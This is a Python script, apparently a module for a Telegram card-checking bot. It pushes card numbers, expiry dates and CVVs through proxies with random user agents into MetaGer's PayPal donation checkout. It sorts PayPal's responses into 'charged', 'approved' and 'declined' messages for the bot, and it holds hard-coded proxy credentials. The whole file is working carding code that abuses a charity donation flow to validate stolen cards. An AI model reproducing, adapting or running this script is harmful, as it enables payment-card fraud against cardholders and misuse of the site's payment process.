import requests, time, json, base64
from fake_useragent import UserAgent

username = "65dipmhvxcjkrxr"
password = "z9awe4tos2xeowa"
proxy = "rp.proxyscrape.com:6060"
proxy = {"http":"http://{}:{}@{}".format(username, password, proxy)}

def luhn_check(card_number):
    digits = [int(digit) for digit in card_number.replace(" ", "")][::-1]
    checksum = 0
    for i, digit in enumerate(digits):
	    if i % 2 == 1:
	        digit *= 2
	        if digit > 9:
		          	digit -= 9
	    checksum += digit
    return checksum % 10 == 0

def process_card_p(card_data):
    start_time = time.time()
    session = requests.Session()
    ua = UserAgent()
    rua = ua.random
    try:
	    card_data = card_data.split('|')
	    num = card_data[0]
	    mon = card_data[1]
	    year = card_data[2]
	    cvv = card_data[3]
	    if len(year) == 2:
	    	year = f'20{year}'
	    else:
	    	year = card_data[2]
    except Exception:
    	return f"{card_data}","Bad Format",False,"5",None
    
    card = f"{num}|{mon}|{year}|{cvv}"
    last4 = num[-4:]
    if num.startswith("4"):
        card_brand = "Visa"
    elif num.startswith("5"):
        card_brand = "MasterCard"
#——————————————————————#
    headers = {
    'authority': 'metager.org',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
    'referer': 'https://metager.org/spende/1/once/paypal/card',
    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': rua,
}

    response1 = requests.get('https://metager.org/spende/1/once/paypal/card/order', headers=headers,proxies=proxy)
    print(response1.text)
    iD = response1.json()["id"]
    print(iD)
    
    if len(iD) != 17:
    	print("retrying")
    	process_card_p(card_data)
#——————————————————————#
    response = requests.get('https://metager.org/spende/5/once/paypal/card',proxies=proxy)
	
    value_start = response.text.find('<input type="hidden" name="client-token" value="') + len('<input type="hidden" name="client-token" value="')
    value_end = response.text.find('">', value_start)
    value = response.text[value_start:value_end]
	
    decoded_value = base64.b64decode(value).decode('utf-8')
	
    json_decoded = json.loads(decoded_value)
	
    accs = (json_decoded["paypal"]["accessToken"])
    print(accs)
#——————————————————————#
    headers = {
    'authority': 'cors.api.paypal.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
    'authorization': f"Bearer {accs}",
    'braintree-sdk-version': '3.32.0-payments-sdk-dev',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'paypal-client-metadata-id': 'b48dd81b0e228e04cc95b3351723794e',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': rua,
}
    json_data = {
    'payment_source': {
        'card': {
            'number': num,
            'expiry': f'{year}-{mon}',
            'security_code': cvv,
            'attributes': {
                'verification': {
                    'method': 'SCA_WHEN_REQUIRED',
                },
            },
        },
    },
    'application_context': {
        'vault': False,
    },
}
    
    response = requests.post(
    f'https://cors.api.paypal.com/v2/checkout/orders/{iD}/confirm-payment-source',
    headers=headers,
    json=json_data,
    proxies=proxy
)
    print(response.text)
#———–———–———–———–———–———#
    if "PAYER_ACTION_REQUIRED" in response.text:
        send_by_bot = False
        end_time = time.time()
        execution_time = end_time - start_time
        add_num = 5
        msg_text = "3D Authentication"
        bot_msg = f"""
═════[  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ:{card}
⌬ sᴛᴀᴛᴜs : OTP ❌
⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ : Paypal
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══    """
        return f"{card}",f"{msg_text}",send_by_bot,add_num,f"{bot_msg}"
    elif "PAYER_CANNOT_PAY" in response.text:
        send_by_bot = False
        end_time = time.time()
        execution_time = end_time - start_time
        add_num = 5
        msg_text = "PAYER_CANNOT_PAY"
        bot_msg = f"""
═════[  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ:{card}
⌬ sᴛᴀᴛᴜs : Gate Error ❌
⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ : Paypal
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══    """
        return f"{card}",f"{msg_text}",send_by_bot,add_num,f"{bot_msg}"
    else:pass
#———–———–———–———–———–———#
    headers = {
    'authority': 'metager.org',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
    'content-type': 'application/json',
    'origin': 'https://metager.org',
    'referer': 'https://metager.org/spende/1/once/paypal/card',
    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': rua,
}

    json_data = {
    'orderID': iD,
    }
#———–———–———–———–———–———#
    response2 = requests.post('https://metager.org/spende/1/once/paypal/card/order', headers=headers, json=json_data,proxies=proxy)
    print(response2.text)
#——————————————————————#
    response2_text = response2.text
    end_time = time.time()
    execution_time = end_time - start_time
    send_by_bot = False
    response_code = "Mostafa"
    
    try:
    	response_code = response2.json()["purchase_units"][0]["payments"]["captures"][0]["processor_response"]["response_code"]
    	if response_code.startswith("PP"):
    		process_card_p(card_data)
    	else:pass
    except:pass
    response_map = {
    "5120": "Insufficient funds",
    "0500": "Card refused",
    "9500": "Fraudulent card",
    "5400": "Card expired",
    "5180": "Luhn Check fails",
    "9520": "Card lost, stolen",
    "1330": "Card not valid",
    "5100": "Card is declined",
    "00N7": "CVC check fails",
    "0580": "Declined by credit institution",
    "Mostafa": "Unkwon Response"
}
    try:
    	msg_text = response_map[response_code]
    	check = True
    except Exception:
    	check = False
    	msg_text = "Unkwon Response"
    add_num = 4
    bot_msg = f"""
═════[  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ:{card}
⌬ sᴛᴀᴛᴜs: Declined ❌
⌬ ʀᴇsᴘᴏɴsᴇ: {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ: Paypal
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══    """
    if check:
	    if response_code in response_map and response_code != '5120' and response_code != '00N7':
	    
	        msg_text = response_map[response_code]
	        bot_msg = f"""
═════[  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ:{card}
⌬ sᴛᴀᴛᴜs: Declined ❌
⌬ ʀᴇsᴘᴏɴsᴇ: {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ: Paypal
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══    """	#——————————————————————#
	    elif response_code == "00N7":
	        msg_text = response_map[response_code]
	        send_by_bot = True
	        add_num = 3
	        bot_msg = f"""
═════[  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ:{card}
⌬ sᴛᴀᴛᴜs:APPRPVED ➜ CNN✅
⌬ ʀᴇsᴘᴏɴsᴇ: {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ: Paypal
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══      """	#——————————————————————#
	    elif response_code == "5120":
	    	msg_text = response_map[response_code]
	    	send_by_bot = True
	    	add_num = 2
	    	bot_msg = f"""
═════[  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ:{card}
⌬ sᴛᴀᴛᴜs : APPRPVED ✅
⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ : Paypal
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══   """
	    if '{"card":{"name"' in response2_text and response_code != "5120" and response_code!= "00N7":
        	msg_text = "Thank you very much!"
        	send_by_bot = True
        	add_num = 1
        	bot_msg = f"""
═════[  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ:{card}
⌬ sᴛᴀᴛᴜs : CHARGED ✅
⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ : Paypal
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══  """
	    
    else:
        	bot_msg = f"""
═════[ <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ:{card}
⌬ sᴛᴀᴛᴜs : Declined ❌
⌬ ʀᴇsᴘᴏɴsᴇ : Unkwon Response
⌬ ɢᴀᴛᴇᴡᴀʏ : Paypal
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══    """
        	print(response2.text)
    return f"{card}",f"{msg_text}",send_by_bot,add_num,f"{bot_msg}"